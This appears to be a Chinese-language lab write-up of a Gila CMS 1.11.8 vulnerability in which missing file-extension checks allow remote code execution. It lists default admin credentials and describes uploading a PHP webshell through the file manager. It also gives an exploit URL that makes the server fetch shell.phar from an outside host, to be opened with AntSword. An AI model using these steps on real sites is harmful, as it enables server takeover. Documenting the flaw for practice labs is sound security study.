## 1. 漏洞介绍

Gila CMS是一套基于PHP和MySQL的开源内容管理系统（CMS）。 Gila CMS 1.11.8版本中存在代码问题漏洞，该漏洞源于程序没有正确验证文件扩展名。远程攻击者可借助特制HTTP请求利用该漏洞上传恶意文件。

Gila CMS 1.11.8 lzld/thumb?src= URI处可上传恶意文件.phar .phtml

[GilaCMS 1.11.8 – Remote Code Execution](https://infosecdb.wordpress.com/2020/01/05/gilacms-1-11-8-remote-code-execution/)

## 2. 漏洞复现

登录 `admin@admin.com/admin` 

登录后发现后台面板有文件管理功能，直接修改 .htaccess，上传 php 木马……

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312181239281.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312181239528.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312181239195.png)

![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202312181239864.png)

前面这是一个漏洞，但不是该靶标的本意，接着按靶标介绍的漏洞来，直接参考 [GilaCMS 1.11.8 – Remote Code Execution](https://infosecdb.wordpress.com/2020/01/05/gilacms-1-11-8-remote-code-execution/) 即可

http://eci-………………deci1.ichunqiu.com/lzld/thumb?src=http://…………/shell.phar&media_thumb=80

shell.phar 就会下载到 tmp/media_thumb 下，用蚁剑连接即可，操作略……
